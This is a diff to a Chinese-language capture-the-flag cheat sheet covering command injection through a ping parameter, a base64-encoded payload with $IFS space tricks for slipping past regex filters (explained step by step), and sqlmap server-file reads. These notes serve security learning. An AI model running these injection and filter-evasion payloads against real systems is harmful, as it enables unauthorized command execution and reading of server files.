@@ -99,7 +99,12 @@ X-Forwarded-For: 127.0.0.1
 
 ### ping 注入
 
+- 如果普通的方法无法绕过正则过滤，则考虑使用 [base 64 绕过复杂的正则表达式](####base 64 绕过复杂的正则表达式)
+
+#### 普通方法
+
 注入
+
 ```bash
 ping -c 4 127.0.0.1 | ls
 ```
@@ -114,11 +119,24 @@ ping -c 4 127.0.0.1&ls
 ping -c 4 127.0.0.1&cat 7672134566268.php| base64
 ```
 
-base 64 绕过复杂的正则表达式
+#### base 64 绕过复杂的正则表达式
+
 ```bash
 http://xxx/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh
 # $IFS$ 是空格绕过
 ```
+
+解释："Y2F0IGZsYWcucGhw" 是 "cat flag.php" 的 Base64 编码。"cat flag.php" 是一个命令，它会显示 "flag.php" 文件的内容。
+
+所以，整个命令 `echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh` 的含义是：
+
+1. 使用 `echo` 命令输出 "Y2F0IGZsYWcucGhw" 这个 Base64 编码的字符串。
+
+2. 使用 `base64 -d` 命令解码这个字符串，得到 "cat flag.php"。
+
+3. 使用 `sh` 命令执行 "cat flag.php"，即显示 "flag.php" 文件的内容。
+
+这个命令的目的是以一种较隐蔽的方式显示 "flag.php" 文件的内容。
 
 ### nmap 注入
 
@@ -283,7 +301,14 @@ python sqlmap.py -u http://x.com --data="name=a&pass=123456aaa"
 # 此处的 name 和 pass 都是 POST 方法的参数
 ```
 
+##### 清空缓存
+
+```bash
+rm -rf /root/.local/share/sqlmap/output/*.*.*.*
+```
+
 #### 服务端文件读取
+
 ```bash
 python sqlmap.py -u http://61.147.171.105:56766/join.ok.php --data="username=a&passwd=a&age=1&blog=baidu.com" --file-read "/var/www/html/flag.php"
 # 重点是 --file-read 参数
@@ -389,7 +414,7 @@ chr() 也是Python的内置函数，用于返回指定Unicode编码的字符。�
   - 如果网站使用无密码 MySQL、Redis，可以考虑用 Gopherus 实现 RCE 注入
 
 
-#### PHP 绕过普通正则表达式
+#### PHP 绕过普通正则表达式的基本替代符
 
 - ${IFS} 和 %09 用于替换空格
 
